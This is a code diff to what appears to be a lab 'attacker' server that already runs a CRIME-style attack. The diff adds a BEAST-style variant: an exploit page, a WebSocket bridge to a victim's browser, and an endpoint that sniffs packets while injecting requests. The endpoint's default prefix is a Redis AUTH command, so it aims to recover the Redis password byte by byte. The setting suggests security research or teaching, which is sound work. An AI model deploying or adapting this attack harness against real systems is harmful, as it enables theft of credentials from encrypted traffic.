@@ -36,6 +36,7 @@ from scapy.all import AsyncSniffer  # type: ignore
 from scapy.layers.inet import IP, TCP  # type: ignore
 
 from attack import run_attack as run_crime_attack
+from attack_beast import BrowserBridge, run_attack as run_beast_attack
 
 LOG = logging.getLogger("attacker")
 
@@ -80,6 +81,7 @@ class PacketLog:
 
 
 PACKET_LOG = PacketLog()
+BROWSER_BRIDGE = BrowserBridge()
 
 
 def _on_packet(pkt) -> None:
@@ -180,6 +182,7 @@ async def handle_status(request: web.Request) -> web.Response:
         "sniff_iface": SNIFF_IFACE,
         "sniff_filter": SNIFF_FILTER,
         "packet_log_len": len(PACKET_LOG),
+        "browser_connected": BROWSER_BRIDGE.connected,
     })
 
 
@@ -270,6 +273,86 @@ async def handle_run_attack(request: web.Request) -> web.Response:
 
 
 # --------------------------------------------------------------------------
+# BEAST variant: exploit page + WebSocket + attack endpoint
+# --------------------------------------------------------------------------
+
+async def handle_exploit(request: web.Request) -> web.Response:
+    with open("/app/exploit.html") as f:
+        return web.Response(text=f.read(), content_type="text/html")
+
+
+async def handle_ws(request: web.Request) -> web.WebSocketResponse:
+    ws = web.WebSocketResponse()
+    await ws.prepare(request)
+
+    BROWSER_BRIDGE.set_ws(ws)
+    LOG.info("browser connected via WebSocket")
+
+    try:
+        async for msg in ws:
+            if msg.type == aiohttp.WSMsgType.TEXT:
+                BROWSER_BRIDGE.on_message(msg.json())
+            elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
+                break
+    finally:
+        BROWSER_BRIDGE.clear_ws()
+        LOG.info("browser disconnected")
+
+    return ws
+
+
+async def handle_run_attack_beast(request: web.Request) -> web.Response:
+    """Run the BEAST-model attack (browser-based injection)."""
+    if not BROWSER_BRIDGE.connected:
+        return web.json_response(
+            {"ok": False, "error": "browser not connected"}, status=503,
+        )
+
+    body: dict[str, Any] = {}
+    if request.body_exists:
+        try:
+            body = await request.json()
+        except Exception:  # noqa: BLE001
+            body = {}
+    known_prefix = body.get(
+        "known_prefix", "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
+    ).encode("utf-8")
+    alphabet = body.get("alphabet", "abcdefghijklmnopqrstuvwxyz0123456789")
+    max_length = int(body.get("max_length", 32))
+    noise_lengths = body.get("noise_lengths") or list(range(8))
+    settle = float(body.get("settle", 0.01))
+    flush_bytes = int(body.get("flush_bytes", 33000))
+    min_margin = int(body.get("min_margin", 64))
+    max_rounds = int(body.get("max_rounds", 64))
+
+    LOG.info(
+        "HTTP /run_attack_beast: prefix=%r alphabet_size=%d max=%d "
+        "min_margin=%d max_rounds=%d",
+        known_prefix, len(alphabet), max_length, min_margin, max_rounds,
+    )
+    try:
+        result = await run_beast_attack(
+            packet_log=PACKET_LOG,
+            bridge=BROWSER_BRIDGE,
+            known_prefix=known_prefix,
+            alphabet_str=alphabet,
+            max_length=max_length,
+            noise_lengths=noise_lengths,
+            settle=settle,
+            flush_bytes=flush_bytes,
+            min_margin=min_margin,
+            max_rounds=max_rounds,
+        )
+    except Exception as exc:  # noqa: BLE001
+        LOG.exception("BEAST attack failed")
+        return web.json_response(
+            {"ok": False, "error": str(exc)}, status=500,
+        )
+    LOG.info("BEAST attack done: recovered=%r", result["recovered"])
+    return web.json_response({"ok": True, **result})
+
+
+# --------------------------------------------------------------------------
 # main
 # --------------------------------------------------------------------------
 
@@ -298,6 +381,9 @@ async def main() -> int:
     app.router.add_post("/trigger_secret", handle_trigger_secret)
     app.router.add_post("/trigger_payload", handle_trigger_payload)
     app.router.add_post("/run_attack", handle_run_attack)
+    app.router.add_get("/exploit", handle_exploit)
+    app.router.add_get("/ws", handle_ws)
+    app.router.add_post("/run_attack_beast", handle_run_attack_beast)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
